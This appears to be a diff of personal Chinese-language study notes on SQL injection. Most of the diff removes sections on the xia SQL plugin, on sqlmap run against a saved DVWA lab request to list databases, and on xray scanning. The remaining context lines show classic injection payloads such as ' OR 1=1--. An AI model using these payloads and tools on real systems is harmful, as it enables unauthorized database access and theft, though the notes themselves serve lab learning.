@@ -13,63 +13,6 @@ Cookie
 需要调用后端功能的 API
 ```
 
-## 1 xia SQL
-
-将 HTTP history 中可能存在 SQL 注入的数据包发送到 xia SQL
-
-![将 HTTP history 中可能存在 SQL 注入的数据包发送到 xia SQL](C:/Users/sec/share/github/notes/images/SQLi/%E5%B0%86%20HTTP%20history%20%E4%B8%AD%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%20SQL%20%E6%B3%A8%E5%85%A5%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85%E5%8F%91%E9%80%81%E5%88%B0%20xia%20SQL.png)
-
-xia SQL 会自动检测是否有疑似 SQL 注入漏洞的存在
-
-![xia SQL 会自动检测是否有疑似 SQL 注入的漏洞存在](C:/Users/sec/share/github/notes/images/SQLi/xia%20SQL%20%E4%BC%9A%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E6%9C%89%E7%96%91%E4%BC%BC%20SQL%20%E6%B3%A8%E5%85%A5%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8.png)
-
-## 2 Sqlmap
-
-将疑似存在 SQL 注入漏洞的数据包保存到 `FileName.txt` ,
-
-```shell
-┌──(root㉿kali)-[~]
-└─# vim FileName.txt
-```
-
-```http
-GET /dvwa/vulnerabilities/brute/?password=456&Login=Login&username=123 HTTP/1.1
-Host: debian.local
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate, br
-DNT: 1
-Connection: keep-alive
-Referer: http://debian.local/dvwa/vulnerabilities/brute/?username=123&password=123&Login=Login
-Cookie: security=low; PHPSESSID=5p1cn67mc1u9bl81502vilbepm
-Upgrade-Insecure-Requests: 1
-Priority: u=0, i
-
-
-```
-
- 使用 Sqlmap 爆破数据库
-
-```shell
-┌──(root㉿kali)-[~]
-└─# sqlmap --beep --batch --level 5 --risk 2 --random-agent -r /Path/FileName.txt --dbs
-```
-
-## 3 xray
-
-直接使用 Chrome 代理到 xray 被动扫描
-
-```powershell
-PS C:\Users\sec> xray webscan --listen 127.0.0.1:7777 --html-output scan.html
-```
-
-扫描出 SQL 注入漏洞后使用 ChatGPT 判断报告中 Payload 的类型, 然后在 Google 查找同类型的 Payload 手动注入
-
-## ==未归纳==
-
-## 手动
-
 验证 sql 注入的方法
 
 ```
@@ -112,14 +55,6 @@ SELECT * FROM products WHERE category = 'Gifts' OR 1=1
 SELECT * FROM users WHERE username = 'administrator'--+' AND password = ''
 ```
 
-## 扫描器
-
-sqlmap 在可使用 -r test.txt 对数据包进行注入（可测登录时的数据包）
-
----
-
-SQL 注入漏洞是一种通过将恶意的 SQL 代码注入到应用程序的数据库查询中，从而未经授权地访问、修改或破坏数据库数据的安全漏洞。
-
 ## 1 MySQL 的 SQL 注入
 
 > 在 sql 语句中 1 位数字，'1' 为字符，（但是1=’1‘），'a' 必须有单引号
@@ -161,7 +96,7 @@ select * from users where username='admin' or 1=1 -- ' and password='密码'
 3. **错误消息分析：**
 
    ```
-   ?id=1' AND 1=1--
+   ?id=1' AND 1=1-- 
    ?id=1' AND 1=2--
    ```
 
